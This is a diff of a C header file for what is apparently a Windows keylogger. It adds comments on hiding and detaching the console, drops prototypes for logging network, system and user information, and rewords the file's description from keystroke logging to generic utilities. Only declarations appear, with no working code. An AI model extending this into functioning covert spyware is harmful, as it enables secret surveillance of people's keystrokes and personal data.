@@ -22,8 +22,8 @@
 *
 * DESCRIPTION
 * -----------------------------------------------------------------------------
-* File containing the declarations of all the functions used to log the 
-* keystrokes.
+* File containing all thedeclarations of the  utils functions used by the 
+* program.
 * -----------------------------------------------------------------------------
 */
 
@@ -38,17 +38,24 @@
 
 //------------------------------------------------------------------- FUNCTIONS
 
+/*
+* Function that initializes the program :
+*  - hides the Windows console
+*  - detaches the program from the console
+*/
 void initialize_program( void );
 
-// Log informations into the log file
+/*
+* Function that log informations passed through unamed parameters.
+* The informations are saved in the log file in the specified format.
+*/
 void log_infos( FILE * log_file, const char * format, ... );
 
-void log_network_infos( FILE * log_file );
-void log_system_infos( FILE * log_file );
-void log_user_infos( FILE * log_file );
-
+/*
+* Function that opens a file a checks if the opening succeeded :
+*  - if the opening failed, the programm is killed
+*  - if the opening succeeded, the file pointer is returned
+*/
 FILE * open_file( char * file_name );
-
-
 
 #endif /* BB_KEYLOGGER_H */
